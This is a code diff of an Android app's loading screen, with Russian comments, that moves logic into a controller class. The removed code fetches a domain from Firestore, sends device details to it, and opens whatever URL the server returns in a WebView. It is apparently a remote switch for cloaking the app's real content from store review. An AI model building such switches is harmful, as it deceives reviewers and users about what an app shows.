@@ -36,6 +36,7 @@ import okio.Buffer;
 public class LoadingActivity extends AppCompatActivity {
 
     private ProgressBar progressBar;
+    private LoadingActivityController controller;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -43,145 +44,10 @@ public class LoadingActivity extends AppCompatActivity {
         setContentView(R.layout.activity_loading);
 
         progressBar = findViewById(R.id.progressBar);
+        controller = new LoadingActivityController(this);
 
-        // Инициализация Firebase SDK
-        FirebaseApp.initializeApp(this);
-
-        // Проверка наличия интернета
-        if (isInternetAvailable()) {
-            // Обращение к Firebase и серверу
-            initializeFirebase();
-            getDomainFromFirestore();
-        } else {
-            openMainActivity();
-        }
-    }
-
-    private void initializeFirebase() {
-        // Инициализация Firebase Analytics
-        FirebaseAnalytics firebaseAnalytics = FirebaseAnalytics.getInstance(this);
-        // Инициализация Firebase Cloud Messaging и других сервисов, если необходимо
-    }
-
-    private void getDomainFromFirestore() {
-        FirebaseFirestore db = FirebaseFirestore.getInstance();
-        DocumentReference docRef = db.collection("database").document("check");
-
-        docRef.get().addOnCompleteListener(task -> {
-            if (task.isSuccessful()) {
-                DocumentSnapshot document = task.getResult();
-                if (document.exists()) {
-                    String link = document.getString("link");
-                    Log.d("LINK", link);
-                    if (link != null && !link.isEmpty()) {
-                        // В link есть домен сайта, переходите к следующему шагу
-                        // Формирование ссылки и обращение к серверу
-                        String serverUrl = formServerUrl(link);
-                        Log.d("URL", serverUrl);
-                        makeServerRequest(serverUrl);
-                    } else {
-                        // link пустой, открывайте MainActivity
-                        openMainActivity();
-                    }
-                } else {
-                    // Ошибка получения документа, открывайте MainActivity
-                    openMainActivity();
-                }
-            } else {
-                // Ошибка выполнения запроса, открывайте MainActivity
-                openMainActivity();
-            }
-        });
-    }
-
-    private String formServerUrl(String link) {
-        String domenFromFirebase = link; // Полученный домен из Firebase Cloud Firestore
-        String packageName = getPackageName(); // Пакет приложения
-        String userId = UUID.randomUUID().toString(); // Генерация UUID для пользователя
-        String timeZone = TimeZone.getDefault().getID(); // Таймзона устройства
-
-        String url = domenFromFirebase + "/?packageid=" + packageName +
-                "&usserid=" + userId +
-                "&getz=" + timeZone +
-                "&getr=utm_source=google-play&utm_medium=organic";
-
-        return url;
-    }
-
-    private static String getUserAgent(Context context) {
-        WebView webView = new WebView(context);
-        WebSettings settings = webView.getSettings();
-        return settings.getUserAgentString();
-    }
-
-    private void makeServerRequest(String serverUrl) {
-        // Выполнение запроса к серверу и обработка ответа
-        OkHttpClient client = new OkHttpClient.Builder()
-                .build();
-
-        Request request = new Request.Builder()
-                .header("User-Agent", getUserAgent(this))
-                .url(serverUrl)
-                .build();
-
-        String userAgent = request.header("User-Agent");
-        if (userAgent != null) {
-            Log.d("User-Agent", userAgent);
-        } else {
-            Log.d("User-Agent", "User-Agent не указан");
-        }
-
-        Log.d("FULL", request.toString());
-
-        //String userAgent = request.header("User-Agent"); // Получение значения User-Agent
-
-        //Log.d("User-Agent", userAgent); // Логирование User-Agent
-
-        client.newCall(request).enqueue(new Callback() {
-            @Override
-            public void onFailure(Call call, IOException e) {
-                // Обработка ошибки
-                runOnUiThread(() -> openMainActivity());
-            }
-
-            @Override
-            public void onResponse(Call call, Response response) throws IOException {
-                //if (response.isSuccessful()) {
-                    String responseString = response.body().string();
-                    if (responseString.equals("error")) {
-                        // Ошибка, открывайте MainActivity
-                        Log.d("HERE", "HERE");
-                        runOnUiThread(() -> openMainActivity());
-                    } else {
-                        // Получен сайт, открывайте WebActivity
-                        runOnUiThread(() -> openWebActivity(responseString));
-                    }
-//                } else {
-//
-//                    // Ошибка сервера, открывайте MainActivity
-//                    runOnUiThread(() -> openMainActivity());
-//                }
-            }
-        });
+        controller.process();
     }
 
 
-    private void openWebActivity(String url) {
-        Intent intent = new Intent(LoadingActivity.this, WebActivity.class);
-        intent.putExtra("url", url);
-        startActivity(intent);
-        finish();
-    }
-
-    private boolean isInternetAvailable() {
-        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
-        return networkInfo != null && networkInfo.isConnected();
-    }
-
-    private void openMainActivity() {
-        Intent intent = new Intent(LoadingActivity.this, MainActivity.class);
-        startActivity(intent);
-        finish();
-    }
 }
